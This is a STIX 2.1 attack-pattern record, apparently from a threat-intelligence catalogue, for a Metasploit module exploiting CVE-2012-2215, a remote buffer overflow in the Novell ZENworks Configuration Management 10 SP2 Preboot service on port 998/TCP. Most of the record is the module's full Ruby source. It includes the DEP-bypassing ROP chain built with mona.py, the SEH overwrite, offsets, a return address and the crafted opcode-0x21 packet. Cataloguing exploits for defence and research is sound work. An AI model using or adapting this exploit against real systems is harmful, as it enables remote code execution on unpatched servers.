{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed0e223a-5744-47b2-be96-36e64b02c092",
    "created": "2024-08-14T16:38:49.4139Z",
    "modified": "2024-08-14T16:38:49.413904Z",
    "name": "Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow",
    "description": " This module exploits a remote buffer overflow in the ZENworks Configuration Management 10 SP2. The vulnerability exists in the Preboot service and can be triggered by sending a specially crafted packet with the opcode 0x21 (PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2 (DEP bypass).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/zenworks_preboot_op21_bof.rb",
            "external_id": "zenworks_preboot_op21_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2215"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7005572"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a remote buffer overflow in the ZENworks Configuration\n        Management 10 SP2. The vulnerability exists in the Preboot service and can be\n        triggered by sending a specially crafted packet with the opcode 0x21\n        (PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on\n        Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2\n        (DEP bypass).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Stephen Fewer', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2215' ],\n          [ 'OSVDB', '65361' ],\n          [ 'BID', '40486' ],\n          [ 'ZDI', '10-090' ],\n          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7005572' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\",\n          'Space'=> 8138,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xC4\\x54\\xF2\\xFF\\xFF\" # add esp, -3500\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2',\n            {\n              'Offset'            => 8252,\n              'OffsetBottomStack' => 8288,\n              'OffsetRop'         => 44,\n              'Ret'               => 0x0040175a # add esp, 0x408 # ret - novell_pbserv.exe\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-03-30',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(998)])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  # rop chain generated with mona.py\n  def create_rop_chain()\n    rop_gadgets =\n      [\n        0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]\n        0x00001000, # 0x00001000-> edx\n        0x10062113, # POP ECX # RETN [zenimgweb.dll]\n        0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]\n        0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        junk,       # Filler (compensate)\n        0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]\n        0x1002fd05, # POP EBP # RETN [zenimgweb.dll]\n        0x10043053, # & push esp #  ret  [zenimgweb.dll]\n        0x1003cbf8, # POP EBX # RETN [zenimgweb.dll]\n        0x00000001, # 0x00000001-> ebx\n        0x00423eeb, # POP ECX # RETN [novell-pbserv.exe]\n        0x00000040, # 0x00000040-> ecx\n        0x1003173e, # POP EDI # RETN [zenimgweb.dll]\n        0x10020801, # RETN (ROP NOP) [zenimgweb.dll]\n        0x00406b58, # POP EAX # RETN [novell-pbserv.exe]\n        nop,\n        0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll]\n    ].pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n\n  def exploit\n    connect\n\n    buf = rand_text(target['OffsetRop'])\n    buf << create_rop_chain\n    buf << payload.encoded\n    buf << rand_text(target['Offset'] - buf.length)\n    buf << generate_seh_record(target.ret)\n    buf << rand_text(target['OffsetBottomStack'] - buf.length)\n\n    packet =  [0x21].pack(\"N\") # Opcode 0x21 PROXY_CMD_FTP_FILE\n    packet << [buf.length].pack(\"N\") # Length\n    packet << buf # Value\n    sock.put(packet)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-30",
    "x_mitre_platforms": [
        "['win']"
    ]
}